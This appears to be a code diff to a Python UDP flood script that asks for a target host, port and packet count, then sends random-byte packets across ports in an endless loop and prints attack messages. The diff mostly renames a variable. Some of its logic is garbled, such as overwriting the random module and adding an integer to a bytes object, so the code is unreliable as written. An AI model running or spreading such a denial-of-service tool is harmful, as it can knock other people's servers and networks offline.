@@ -10,8 +10,8 @@ R = '\033[31m'
 N = '\033[0m'
 
 white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-imets = random._urandom(35516)
-imets = random._urandom(35512)
+bytes = random._urandom(35516)
+bytes = random._urandom(35512)
 
 os.system("clear")
 
@@ -41,7 +41,7 @@ print()
 ip = input("[+] Enter the targets host : ")
 Port = input("[+] Enter the targets port : ")
 sent = input("[+] Enter the targets packet 1-20000000 : ")
-imets = input("[+] Enter the random tools : ")
+bytes = input("[+] Enter the random tools : ")
 os.system("clear")
 print("Waiting 5 second DDOS")
 time.sleep(5)
@@ -52,11 +52,11 @@ time.sleep(3)
 while True:
     sent = 0
     for port in range(1, 15000000):
-        white.sendto(imets, (ip, port))
+        white.sendto(bytes, (ip, port))
         sent = sent + 1
         sent==15000000
-        imets = imets + 1
-        imets==15000000
+        random = random + 1
+        random==15000000
         print("\033[1;91mHas Been Attack ====> \033[1;32m%s \033[1;91m Has Been Sent Packet to =====> \033[1;32m%s \033[1;91mHas Been Attack Port =====> \033[1;32m%s " % (sent, ip, port))
 
 print("\033[1;92mAttack finished\033[0m")
